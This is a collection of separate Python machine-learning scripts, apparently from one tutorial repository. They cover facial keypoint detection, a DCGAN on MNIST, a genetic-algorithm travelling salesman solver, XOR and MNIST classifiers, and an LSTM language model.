import matplotlib.pyplot as plt

from models import create_model, create_mobilenet_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data


def get_predictions(model, X):
    predicted_keypoints = model.predict(X)
    predicted_keypoints = predicted_keypoints.reshape(-1, *OUTPUT_SHAPE)
    return predicted_keypoints
    

def show_keypoints(image, predicted_keypoints, true_keypoints):
    predicted_keypoints = untransform(predicted_keypoints)
    true_keypoints = untransform(true_keypoints)
    plt.imshow(np.squeeze(image), cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def untransform(keypoints):
    return keypoints *224


# # construct the model
model = create_mobilenet_model((*IMAGE_SIZE, 3), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1_mobilenet_crop.h5")

X_test, y_test = load_data(testing_file)
y_test = y_test.reshape(-1, *OUTPUT_SHAPE)

y_pred = get_predictions(model, X_test)
print(y_pred[0])
print(y_pred.shape)
print(y_test.shape)
print(X_test.shape)

for i in range(50):
    show_keypoints(X_test[i+400], y_pred[i+400], y_test[i+400])




import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

from sklearn.preprocessing import MinMaxScaler
from tqdm import tqdm
# from tensorflow.keras.layers import Conv2D, Dense, MaxPooling2D
from tensorflow.keras.callbacks import TensorBoard, ModelCheckpoint


import os

from models import create_model, create_mobilenet_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data

# # read the training dataframe
# training_df = pd.read_csv("data/training_frames_keypoints.csv")

# # print the number of images available in the training dataset
# print("Number of images in training set:", training_df.shape[0])

def show_keypoints(image, key_points):
    # show the image
    plt.imshow(image)
    # use scatter() to plot the keypoints in the faces
    plt.scatter(key_points[:, 0], key_points[:, 1], s=20, marker=".")
    plt.show()

# show an example image
# n = 124
# image_name = training_df.iloc[n, 0]
# keypoints = training_df.iloc[n, 1:].values.reshape(-1, 2)
# show_keypoints(mpimg.imread(os.path.join("data", "training", image_name)), key_points=keypoints)

model_name = "model_smoothl1_mobilenet_crop"

# construct the model
model = create_mobilenet_model((*IMAGE_SIZE, 3), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

# model.load_weights("results/model3.h5")

X_train, y_train = load_data(training_file, to_gray=False)
X_test, y_test = load_data(testing_file, to_gray=False)

if not os.path.isdir("results"):
    os.mkdir("results")

tensorboard = TensorBoard(log_dir=os.path.join("logs", model_name))
# checkpoint = ModelCheckpoint(os.path.join("results", model_name), save_best_only=True, verbose=1)

history = model.fit(X_train, y_train,
                    batch_size=BATCH_SIZE,
                    epochs=EPOCHS,
                    validation_data=(X_test, y_test),
                    # callbacks=[tensorboard, checkpoint],
                    callbacks=[tensorboard],
                    verbose=1)


model.save("results/" + model_name + ".h5")




import numpy as np
import pandas as pd
import matplotlib.image as mpimg
import matplotlib.pyplot as plt
import cv2
from tqdm import tqdm


import os

from parameters import IMAGE_SIZE, OUTPUT_SHAPE


def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    # predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(image, cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        # true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def resize_image(image, image_size):
    return cv2.resize(image, image_size)


def random_crop(image, keypoints):
    h, w = image.shape[:2]
    new_h, new_w = IMAGE_SIZE
    keypoints = keypoints.reshape(-1, 2)
    try:
        top = np.random.randint(0, h - new_h)
        left = np.random.randint(0, w - new_w)
    except ValueError:
        return image, keypoints
    image = image[top: top + new_h, left: left + new_w]
    keypoints = keypoints - [left, top]
    
    return image, keypoints


def normalize_image(image, to_gray=True):
    if image.shape[2] == 4:
        # if the image has an alpha color channel (opacity)
        # let's just remove it
        image = image[:, :, :3]
    # get the height & width of image
    h, w = image.shape[:2]
    new_h, new_w = IMAGE_SIZE
    new_h, new_w = int(new_h), int(new_w)

    # scaling the image to that IMAGE_SIZE
    # image = cv2.resize(image, (new_w, new_h))
    image = resize_image(image, (new_w, new_h))
    if to_gray:
        # convert image to grayscale
        image = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
    # normalizing pixels from the range [0, 255] to [0, 1]
    image = image / 255.0
    if to_gray:
        image = np.expand_dims(image, axis=2)
    return image



def normalize_keypoints(image, keypoints):
    # get the height & width of image
    h, w = image.shape[:2]
    # reshape to coordinates (x, y)
    # i.e converting a vector of (136,) to the 2D array (68, 2)
    new_h, new_w = IMAGE_SIZE
    new_h, new_w = int(new_h), int(new_w)
    keypoints = keypoints.reshape(-1, 2)
    # scale the keypoints also
    keypoints = keypoints * [new_w / w, new_h / h]
    keypoints = keypoints.reshape(-1)
    # normalizing keypoints from [0, IMAGE_SIZE] to [0, 1] (experimental)
    keypoints = keypoints / 224
    # keypoints = (keypoints - 100) / 50
    return keypoints

def normalize(image, keypoints, to_gray=True):
    image, keypoints = random_crop(image, keypoints)
    return normalize_image(image, to_gray=to_gray), normalize_keypoints(image, keypoints)

def load_data(csv_file, to_gray=True):
    # read the training dataframe
    df = pd.read_csv(csv_file)
    all_keypoints = np.array(df.iloc[:, 1:])
    image_names = list(df.iloc[:, 0])
    # load images
    X, y = [], []
    X = np.zeros((len(image_names), *IMAGE_SIZE, 3), dtype="float32")
    y = np.zeros((len(image_names), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1]))
    for i, (image_name, keypoints) in enumerate(zip(tqdm(image_names, "Loading " + os.path.basename(csv_file)), all_keypoints)):
        image = mpimg.imread(os.path.join("data", "training", image_name))
        image, keypoints = normalize(image, keypoints, to_gray=to_gray)
        X[i] = image
        y[i] = keypoints

    return X, y




"""
DCGAN on MNIST using Keras
"""
# to use CPU
import os

# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )

import numpy as np
import matplotlib.pyplot as plt
import tqdm
import glob
# from tensorflow.examples.tutorials.mnist import input_data

from keras.models import Sequential
from keras.layers import Dense, Activation, Flatten, Reshape
from keras.layers import Conv2D, Conv2DTranspose, UpSampling2D
from keras.layers import LeakyReLU, Dropout, BatchNormalization
from keras.optimizers import Adam, RMSprop
from keras.datasets import mnist

class GAN:
    def __init__(self, img_x=28, img_y=28, img_z=1):
        self.img_x = img_x
        self.img_y = img_y
        self.img_z = img_z

        self.D = None  # discriminator
        self.G = None  # generator
        self.AM = None # adversarial model
        self.DM = None # discriminator model

    def discriminator(self):
        if self.D:
            return self.D

        self.D = Sequential()

        depth = 64
        dropout = 0.4
        input_shape = (self.img_x, self.img_y, self.img_z)

        self.D.add(Conv2D(depth, 5, strides=2, input_shape=input_shape, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*2, 5, strides=2, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*4, 5, strides=2, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*8, 5, strides=1, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        # convert to 1 dimension
        self.D.add(Flatten())
        self.D.add(Dense(1, activation="sigmoid"))
        print("="*50, "Discriminator", "="*50)
        self.D.summary()
        return self.D

    def generator(self):
        if self.G:
            return self.G

        self.G = Sequential()
        dropout = 0.4
        # covnerting from 100 vector noise to dim x dim x depth
        # (100,) to (7, 7, 256)
        depth = 64 * 4
        dim = 7
        
        self.G.add(Dense(dim*dim*depth, input_dim=100))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Reshape((dim, dim, depth)))
        self.G.add(Dropout(dropout))

        # upsampling to (14, 14, 128)
        self.G.add(UpSampling2D())
        self.G.add(Conv2DTranspose(depth // 2, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # up to (28, 28, 64)
        self.G.add(UpSampling2D())
        self.G.add(Conv2DTranspose(depth // 4, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # to (28, 28, 32)
        self.G.add(Conv2DTranspose(depth // 8, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # to (28, 28, 1) (img)
        self.G.add(Conv2DTranspose(1, 5, padding="same"))
        self.G.add(Activation("sigmoid"))
        print("="*50, "Generator", "="*50)
        self.G.summary()
        return self.G

    def discriminator_model(self):
        if self.DM:
            return self.DM
        # optimizer = RMSprop(lr=0.001, decay=6e-8)
        optimizer = Adam(0.0002, 0.5)
        self.DM = Sequential()
        self.DM.add(self.discriminator())
        self.DM.compile(loss="binary_crossentropy", optimizer=optimizer, metrics=["accuracy"])
        return self.DM

    def adversarial_model(self):
        if self.AM:
            return self.AM
        # optimizer = RMSprop(lr=0.001, decay=3e-8)
        optimizer = Adam(0.0002, 0.5)
        self.AM = Sequential()
        self.AM.add(self.generator())
        self.AM.add(self.discriminator())
        self.AM.compile(loss="binary_crossentropy", optimizer=optimizer, metrics=["accuracy"])
        return self.AM


class MNIST:
    def __init__(self):
        self.img_x = 28
        self.img_y = 28
        self.img_z = 1

        self.steps = 0

        self.load_data()
        self.create_models()

        # used image indices
        self._used_indices = set()

    def load_data(self):
        (self.X_train, self.y_train), (self.X_test, self.y_test) = mnist.load_data()
        # reshape to (num_samples, 28, 28 , 1)
        self.X_train = np.expand_dims(self.X_train, axis=-1)
        self.X_test = np.expand_dims(self.X_test, axis=-1)

    def create_models(self):
        self.GAN = GAN()
        self.discriminator = self.GAN.discriminator_model()
        self.adversarial = self.GAN.adversarial_model()
        self.generator = self.GAN.generator()
        discriminators = glob.glob("discriminator_*.h5")
        generators = glob.glob("generator_*.h5")
        adversarial = glob.glob("adversarial_*.h5")
        if len(discriminators) != 0:
            print("[+] Found a discriminator ! Loading weights ...")
            self.discriminator.load_weights(discriminators[0])
        if len(generators) != 0:
            print("[+] Found a generator ! Loading weights ...")
            self.generator.load_weights(generators[0])
        if len(adversarial) != 0:
            print("[+] Found an adversarial model ! Loading weights ...")
            self.steps = int(adversarial[0].replace("adversarial_", "").replace(".h5", ""))
            self.adversarial.load_weights(adversarial[0])


    def get_unique_random(self, batch_size=256):
        indices = np.random.randint(0, self.X_train.shape[0], size=batch_size)
        # in_used_indices = np.any([i in indices for i in self._used_indices])
        # while in_used_indices:
        #     indices = np.random.randint(0, self.X_train.shape[0], size=batch_size)
        #     in_used_indices = np.any([i in indices for i in self._used_indices])
        # self._used_indices |= set(indices)
        # if len(self._used_indices) > self.X_train.shape[0] // 2:
            # if used indices is more than half of training samples, clear it
            # that is to enforce it to train at least more than half of the dataset uniquely
            # self._used_indices.clear()
        return indices
        


    def train(self, train_steps=2000, batch_size=256, save_interval=0):
        noise_input = None
        
        steps = tqdm.tqdm(list(range(self.steps, train_steps)))
        fake = np.zeros((batch_size, 1))
        real = np.ones((batch_size, 1))
        for i in steps:
            real_images = self.X_train[self.get_unique_random(batch_size)]
            # noise = np.random.uniform(-1.0, 1.0, size=(batch_size, 100))
            noise = np.random.normal(size=(batch_size, 100))
            fake_images = self.generator.predict(noise)
            # get 256 real images and 256 fake images
            d_loss_real = self.discriminator.train_on_batch(real_images, real)
            d_loss_fake = self.discriminator.train_on_batch(fake_images, fake)
            d_loss = 0.5 * np.add(d_loss_real, d_loss_fake)
            # X = np.concatenate((real_images, fake_images))
            # y = np.zeros((2*batch_size, 1))
            # 0 for fake and 1 for real
            # y[:batch_size, :] = 1

            # shuffle
            # shuffle_in_unison(X, y)

            # d_loss = self.discriminator.train_on_batch(X, y)

            # y = np.ones((batch_size, 1))
            # noise = np.random.uniform(-1.0, 1.0, size=(batch_size, 100))
            # fool the adversarial, telling him everything is real
            a_loss = self.adversarial.train_on_batch(noise, real)
            log_msg = f"[D loss: {d_loss[0]:.6f}, D acc: {d_loss[1]:.6f} | A loss: {a_loss[0]:.6f}, A acc: {a_loss[1]:.6f}]"
            steps.set_description(log_msg)

            if save_interval > 0:
                noise_input = np.random.uniform(low=-1, high=1.0, size=(16, 100))
                if (i + 1) % save_interval == 0:
                    self.plot_images(save2file=True, samples=noise_input.shape[0], noise=noise_input, step=(i+1))
                    self.discriminator.save(f"discriminator_{i+1}.h5")
                    self.generator.save(f"generator_{i+1}.h5")
                    self.adversarial.save(f"adversarial_{i+1}.h5")

        
    def plot_images(self, save2file=False, fake=True, samples=16, noise=None, step=0):
        filename = "mnist_fake.png"
        if fake:
            if noise is None:
                noise = np.random.uniform(-1.0, 1.0, size=(samples, 100))
            else:
                filename = f"mnist_{step}.png"
            images = self.generator.predict(noise)
        else:
            i = np.random.randint(0, self.X_train.shape[0], samples)
            images = self.X_train[i]
            if noise is None:
                filename = "mnist_real.png"

        plt.figure(figsize=(10, 10))
        for i in range(images.shape[0]):
            plt.subplot(4, 4, i+1)
            image = images[i]
            image = np.reshape(image, (self.img_x, self.img_y))
            plt.imshow(image, cmap="gray")
            plt.axis("off")
        plt.tight_layout()
        if save2file:
            plt.savefig(filename)
            plt.close("all")
        else:
            plt.show()


# https://stackoverflow.com/questions/4601373/better-way-to-shuffle-two-numpy-arrays-in-unison
def shuffle_in_unison(a, b):
    rng_state = np.random.get_state()
    np.random.shuffle(a)
    np.random.set_state(rng_state)
    np.random.shuffle(b)


if __name__ == "__main__":
    mnist_gan = MNIST()
    mnist_gan.train(train_steps=10000, batch_size=256, save_interval=500)
    mnist_gan.plot_images(fake=True, save2file=True)
    mnist_gan.plot_images(fake=False, save2file=True)




import random
import numpy as np
import pandas as pd
import operator
import matplotlib.pyplot as plt
from threading import Event, Thread


class Individual:
    def __init__(self, object):
        self.object = object

    def update(self, new):
        self.object = new

    def __repr__(self):
        return self.object
    
    def __str__(self):
        return self.object


class GeneticAlgorithm:
    """General purpose genetic algorithm implementation"""

    def __init__(self, individual, popsize, elite_size, mutation_rate, generations, fitness_func, plot=True, prn=True, animation_func=None):
        self.individual = individual
        self.popsize = popsize
        self.elite_size = elite_size
        self.mutation_rate = mutation_rate
        self.generations = generations
        if not callable(fitness_func):
            raise TypeError("fitness_func must be a callable object.")
        self.get_fitness = fitness_func
        self.plot = plot
        self.prn = prn
        self.population = self._init_pop()
        self.animate = animation_func
        
    def calc(self):
        """Try to find the best individual.
        This function returns (initial_individual, final_individual, """
        sorted_pop = self.sortpop()
        initial_route = self.population[sorted_pop[0][0]]
        distance = 1 / sorted_pop[0][1]
        progress = [ distance ]
        if callable(self.animate):
            self.plot = True
            individual = Individual(initial_route)
            stop_animation = Event()
            self.animate(individual, progress, stop_animation, plot_conclusion=initial_route)
        else:
            self.plot = False
        if self.prn:
            print(f"Initial distance: {distance}")
        try:
            if self.plot:
                for i in range(self.generations):
                    population = self.next_gen()
                    sorted_pop = self.sortpop()
                    distance = 1 / sorted_pop[0][1]
                    progress.append(distance)
                    if self.prn:
                        print(f"[Generation:{i}] Current distance: {distance}")
                    route = population[sorted_pop[0][0]]
                    individual.update(route)
            else:
                for i in range(self.generations):
                    population = self.next_gen()
                    distance = 1 / self.sortpop()[0][1]
                    if self.prn:
                        print(f"[Generation:{i}] Current distance: {distance}")
                    
                    
        except KeyboardInterrupt:
            pass
        try:
            stop_animation.set()
        except NameError:
            pass
        final_route_index = self.sortpop()[0][0]
        final_route = population[final_route_index]
        if self.prn:
            print("Final route:", final_route)

        return initial_route, final_route, distance

    def create_population(self):
        return random.sample(self.individual, len(self.individual))

    def _init_pop(self):
        return [ self.create_population() for i in range(self.popsize) ]

    def sortpop(self):
        """This function calculates the fitness of each individual in population
        And returns a population sorted by its fitness in descending order"""
        result = [ (i, self.get_fitness(individual)) for i, individual in enumerate(self.population) ]
        return sorted(result, key=operator.itemgetter(1), reverse=True)

    def selection(self):
        sorted_pop = self.sortpop()
        df = pd.DataFrame(np.array(sorted_pop), columns=["Index", "Fitness"])
        df['cum_sum']  = df['Fitness'].cumsum()
        df['cum_perc'] = 100 * df['cum_sum'] / df['Fitness'].sum()
        result = [ sorted_pop[i][0] for i in range(self.elite_size) ]

        for i in range(len(sorted_pop) - self.elite_size):
            pick = random.random() * 100
            for i in range(len(sorted_pop)):
                if pick <= df['cum_perc'][i]:
                    result.append(sorted_pop[i][0])
                    break
        return [ self.population[index] for index in result ]

    def breed(self, parent1, parent2):
        child1, child2 = [], []

        gene_A = random.randint(0, len(parent1))
        gene_B = random.randint(0, len(parent2))

        start_gene = min(gene_A, gene_B)
        end_gene   = max(gene_A, gene_B)

        for i in range(start_gene, end_gene):
            child1.append(parent1[i])
        
        child2 = [ item for item in parent2 if item not in child1 ]
        return child1 + child2

    def breed_population(self, selection):
        pool = random.sample(selection, len(selection))
        children = [selection[i] for i in range(self.elite_size)]
        children.extend([self.breed(pool[i], pool[len(selection)-i-1]) for i in range(len(selection) - self.elite_size)])
        return children

    def mutate(self, individual):
        individual_length = len(individual)
        for swapped in range(individual_length):
            if(random.random() < self.mutation_rate):
                swap_with = random.randint(0, individual_length-1)
                individual[swapped], individual[swap_with] = individual[swap_with], individual[swapped]
        return individual

    def mutate_population(self, children):
        return [ self.mutate(individual) for individual in children ]

    def next_gen(self):
        selection = self.selection()
        children = self.breed_population(selection)
        self.population = self.mutate_population(children)
        return self.population




from genetic import plt
from genetic import Individual
from threading import Thread


def plot_routes(initial_route, final_route):
    _, ax = plt.subplots(nrows=1, ncols=2)

    for col, route in zip(ax, [("Initial Route", initial_route), ("Final Route", final_route) ]):
        col.title.set_text(route[0])
        route = route[1]
        for i, city in enumerate(route):
            if i == 0:
                col.text(city.x-5, city.y+5, "Start")
                col.scatter(city.x, city.y, s=70, c='g')
            else:
                col.scatter(city.x, city.y, s=70, c='b')

        col.plot([ city.x for city in route ], [city.y for city in route], c='r')
        col.plot([route[-1].x, route[0].x], [route[-1].y, route[0].y], c='r')
    
    plt.show()


def animate_progress(route, progress, stop_animation, plot_conclusion=None):
        
    def animate():
        nonlocal route
        _, ax1 = plt.subplots(nrows=1, ncols=2)
        while True:
            if isinstance(route, Individual):
                target = route.object
            ax1[0].clear()
            ax1[1].clear()

            # current routes and cities
            ax1[0].title.set_text("Current routes")
            
            for i, city in enumerate(target):
                if i == 0:
                    ax1[0].text(city.x-5, city.y+5, "Start")
                    ax1[0].scatter(city.x, city.y, s=70, c='g')
                else:
                    ax1[0].scatter(city.x, city.y, s=70, c='b')

            ax1[0].plot([ city.x for city in target ], [city.y for city in target], c='r')
            ax1[0].plot([target[-1].x, target[0].x], [target[-1].y, target[0].y], c='r')

            # current distance graph
            ax1[1].title.set_text("Current distance")
            ax1[1].plot(progress)
            ax1[1].set_ylabel("Distance")
            ax1[1].set_xlabel("Generation")

            plt.pause(0.05)
            
            if stop_animation.is_set():
                break
        plt.show()
        if plot_conclusion:
            initial_route = plot_conclusion
            plot_routes(initial_route, target)

    Thread(target=animate).start()




import matplotlib.pyplot as plt
import random
import numpy as np
import operator
from plots import animate_progress, plot_routes


class City:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def distance(self, city):
        """Returns distance between self city and city"""
        x = abs(self.x - city.x)
        y = abs(self.y - city.y)
        return np.sqrt(x ** 2 + y ** 2)

    def __sub__(self, city):
        return self.distance(city)

    def __repr__(self):
        return f"({self.x}, {self.y})"

    def __str__(self):
        return self.__repr__()


def get_fitness(route):

    def get_distance():
        distance = 0
        for i in range(len(route)):
            from_city = route[i]
            to_city = route[i+1] if i+1 < len(route) else route[0]
            distance += (from_city - to_city)
        return distance

    return 1 / get_distance()


def load_cities():
    return [ City(city[0], city[1]) for city in [(169, 20), (103, 24), (41, 9), (177, 76), (138, 173), (163, 108), (93, 34), (200, 84), (19, 184), (117, 176), (153, 30), (140, 29), (38, 108), (89, 183), (18, 4), (174, 38), (109, 169), (93, 23), (156, 10), (171, 27), (164, 91), (109, 194), (90, 169), (115, 37), (177, 93), (169, 20)] ]


def generate_cities(size):
    cities = []
    for i in range(size):
        x = random.randint(0, 200)
        y = random.randint(0, 200)

        if 40 < x < 160:
            if 0.5 <= random.random():
                y = random.randint(0, 40)
            else:
                y = random.randint(160, 200)
        elif 40 < y < 160:
            if 0.5 <= random.random():
                x = random.randint(0, 40)
            else:
                x = random.randint(160, 200)

        cities.append(City(x, y))
    return cities


def benchmark(cities):
    popsizes = [60, 80, 100, 120, 140]
    elite_sizes = [5, 10, 20, 30, 40]
    mutation_rates = [0.02, 0.01, 0.005, 0.003, 0.001]
    generations = 1200

    iterations = len(popsizes) * len(elite_sizes) * len(mutation_rates)
    iteration = 0

    gens = {}
    
    for popsize in popsizes:
        for elite_size in elite_sizes:
            for mutation_rate in mutation_rates:
                iteration += 1
                gen = GeneticAlgorithm(cities, popsize=popsize, elite_size=elite_size, mutation_rate=mutation_rate, generations=generations, fitness_func=get_fitness, prn=False)
                initial_route, final_route, generation = gen.calc(ret=("generation", 755))
                if generation == generations:
                    print(f"[{iteration}/{iterations}] (popsize={popsize}, elite_size={elite_size}, mutation_rate={mutation_rate}): could not reach the solution")
                else:
                    print(f"[{iteration}/{iterations}] (popsize={popsize}, elite_size={elite_size}, mutation_rate={mutation_rate}): {generation} generations was enough")
                if generation != generations:
                    gens[iteration] = generation
    # reversed_gen = {v:k for k, v in gens.items()}
    output = sorted(gens.items(), key=operator.itemgetter(1))
    for i, gens in output:
        print(f"Iteration: {i} generations: {gens}")


# [1] (popsize=60, elite_size=30, mutation_rate=0.001): 235 generations was enough
# [2] (popsize=80, elite_size=20, mutation_rate=0.001): 206 generations was enough
# [3] (popsize=100, elite_size=30, mutation_rate=0.001): 138 generations was enough
# [4] (popsize=120, elite_size=30, mutation_rate=0.002): 117 generations was enough
# [5] (popsize=140, elite_size=20, mutation_rate=0.003): 134 generations was enough

# The notes:
# 1.1 Increasing the mutation rate to higher rate, the curve will be inconsistent and it won't lead us to the optimal distance.
# 1.2 So we need to put it as small as 1% or lower
# 2. Elite size is likely to be about 30% or less of total population
# 3. Generations depends on the other parameters, can be a fixed number, or until we reach the optimal distance.
# 4. 
    

if __name__ == "__main__":
    from genetic import GeneticAlgorithm
    cities = load_cities()
    # cities = generate_cities(50)
    # parameters
    popsize = 120
    elite_size = 30
    mutation_rate = 0.1
    
    generations = 400

    gen = GeneticAlgorithm(cities, popsize=popsize, elite_size=elite_size, mutation_rate=mutation_rate, generations=generations, fitness_func=get_fitness, animation_func=animate_progress)
    initial_route, final_route, distance = gen.calc()




import tensorflow as tf
import matplotlib.pyplot as plt
from sklearn.model_selection import train_test_split
from sklearn.utils import shuffle

import re
import numpy as np
import os
import time
import json
from glob import glob
from PIL import Image
import pickle




import numpy as np
from keras.utils import np_utils
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Activation


np.random.seed(19)

X = np.array([[0,0],[0,1],[1,0],[1,1]]).astype('float32')
y = np.array([[0],[1],[1],[0]]).astype('float32')

y = np_utils.to_categorical(y)

xor = Sequential()

# add required layers
xor.add(Dense(8, input_dim=2))

# hyperbolic tangent function to the first hidden layer ( 8 nodes )
xor.add(Activation("tanh"))

xor.add(Dense(8))
xor.add(Activation("relu"))
# output layer
xor.add(Dense(2))

# sigmoid function to the output layer ( final )
xor.add(Activation("sigmoid"))

# Cross-entropy error function
xor.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

# show the summary of the model
xor.summary()

xor.fit(X, y, epochs=400, verbose=1)

# accuray
score = xor.evaluate(X, y)
print(f"Accuracy: {score[-1]}")


# Checking the predictions
print("\nPredictions:")
print(xor.predict(X))




import torch
import torchvision
from torchvision import transforms, datasets
import torch.nn as nn
import torch.nn.functional as F
import torch.optim as optim
import matplotlib.pyplot as plt

epochs = 3
batch_size = 64

# building the network now
class Net(nn.Module):
    def __init__(self):
        super().__init__()
        # takes 28x28 images
        self.fc1 = nn.Linear(28*28, 64)
        self.fc2 = nn.Linear(64, 64)
        self.fc3 = nn.Linear(64, 64)
        self.fc4 = nn.Linear(64, 10)

    def forward(self, x):
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = F.relu(self.fc3(x))
        x = self.fc4(x)
        return F.log_softmax(x, dim=1)



if __name__ == "__main__":
    training_set = datasets.MNIST("", train=True, download=True,
                            transform=transforms.Compose([
                                transforms.ToTensor()
                            ]))

    test_set = datasets.MNIST("", train=False, download=True,
                                transform=transforms.Compose([
                                    transforms.ToTensor()
                                ]))

    # load the dataset
    train = torch.utils.data.DataLoader(training_set, batch_size=batch_size, shuffle=True)
    test = torch.utils.data.DataLoader(test_set, batch_size=batch_size, shuffle=False)
    # construct the model
    net = Net()
    # specify the loss and optimizer
    loss = nn.CrossEntropyLoss()
    optimizer = optim.Adam(net.parameters(), lr=0.001)

    # training the model
    for epoch in range(epochs):
        for data in train:
            # data is the batch of data now
            # X are the features, y are labels
            X, y = data
            net.zero_grad() # set gradients to 0 before loss calculation
            output = net(X.view(-1, 28*28)) # feed data to the network
            loss = F.nll_loss(output, y) # calculating the negative log likelihood
            loss.backward() # back propagation
            optimizer.step() # attempt to optimize weights to account for loss/gradients
        print(loss)

    correct = 0
    total = 0
    with torch.no_grad():
        for data in test:
            X, y = data
            output = net(X.view(-1, 28*28))
            for index, i in enumerate(output):
                if torch.argmax(i) == y[index]:
                    correct += 1
                total += 1

    print("Accuracy:", round(correct / total, 3))
    # testing
    print(torch.argmax(net(X.view(-1, 28*28))[0]))
    plt.imshow(X[0].view(28, 28))
    plt.show()




from keras.models import Sequential
from keras.layers import LSTM, Dropout, BatchNormalization, LeakyReLU, Dense, Activation, TimeDistributed
from keras.layers import Bidirectional

def rnn_model(input_dim, cell, num_layers, units, dropout, batch_normalization=True, bidirectional=True):
    model = Sequential()
    for i in range(num_layers):
        if i == 0:
            # first time, specify input_shape
            if bidirectional:
                model.add(Bidirectional(cell(units, input_shape=(None, input_dim), return_sequences=True)))
            else:
                model.add(cell(units, input_shape=(None, input_dim), return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))
        else:
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=True)))
            else:
                model.add(cell(units, return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))

    model.add(TimeDistributed(Dense(input_dim, activation="softmax")))

    return model




from utils import UNK, text_to_sequence, sequence_to_text
from keras.preprocessing.sequence import pad_sequences
from keras.layers import LSTM
from models import rnn_model
from scipy.ndimage.interpolation import shift
import numpy as np

# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=6,
                        inter_op_parallelism_threads=6, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

INPUT_DIM = 50

test_text = ""
test_text += """college or good clerk at university has not pleasant days or used not to have them half a century ago but his position was recognized and the misery was measured can we just make something that is useful for making this happen especially when they are just doing it by"""

encoded = np.expand_dims(np.array(text_to_sequence(test_text)), axis=0)
encoded = encoded.reshape((-1, encoded.shape[0], encoded.shape[1]))
model = rnn_model(INPUT_DIM, LSTM, 4, 380, 0.3, bidirectional=False)
model.load_weights("results/lm_rnn_v2_6400548.3.h5")

# for i in range(10):
#     predicted_word_int = model.predict_classes(encoded)[0]
#     print(predicted_word_int, end=',')
#     word = sequence_to_text(predicted_word_int)
#     encoded = shift(encoded, -1, cval=predicted_word_int)
#     print(word, end=' ')
print("Fed:")
print(encoded)
print("Result: predict")
print(model.predict(encoded)[0])
print("Result: predict_proba")
print(model.predict_proba(encoded)[0])
print("Result: predict_classes")
print(model.predict_classes(encoded)[0])
print(sequence_to_text(model.predict_classes(encoded)[0]))
print()




from models import rnn_model
from utils import sequence_to_text, text_to_sequence, get_batches, get_data, get_text, vocab
from keras.layers import LSTM
from keras.callbacks import ModelCheckpoint

import numpy as np
import os

INPUT_DIM = 50
# OUTPUT_DIM = len(vocab)
BATCH_SIZE = 128

# get data
text = get_text("data")
encoded = np.array(text_to_sequence(text))
print(len(encoded))

# X, y = get_data(encoded, INPUT_DIM, 1)

# del text, encoded

model = rnn_model(INPUT_DIM, LSTM, 4, 380, 0.3, bidirectional=False)

model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])
model.summary()
if not os.path.isdir("results"):
    os.mkdir("results")

checkpointer = ModelCheckpoint("results/lm_rnn_v2_{loss:.1f}.h5", verbose=1)

steps_per_epoch = (len(encoded) // 100) // BATCH_SIZE

model.fit_generator(get_batches(encoded, BATCH_SIZE, INPUT_DIM),
                    epochs=100,
                    callbacks=[checkpointer],
                    verbose=1,
                    steps_per_epoch=steps_per_epoch)
model.save("results/lm_rnn_v2_final.h5")




import numpy as np
import os
import tqdm
import inflect
from string import punctuation, whitespace
from word_forms.word_forms import get_word_forms

p = inflect.engine()

